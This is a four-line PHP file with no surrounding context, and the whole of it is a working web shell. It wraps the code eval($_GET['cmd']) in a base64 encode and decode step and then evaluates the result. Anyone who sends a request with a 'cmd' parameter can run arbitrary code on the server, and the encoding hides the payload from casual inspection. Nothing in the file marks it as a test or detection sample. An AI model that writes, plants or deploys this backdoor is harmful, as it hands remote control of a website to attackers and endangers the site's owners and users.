<?php
$a = 'eval($_GET[\'cmd\']);';
$b = base64_encode($a);
eval(base64_decode($b));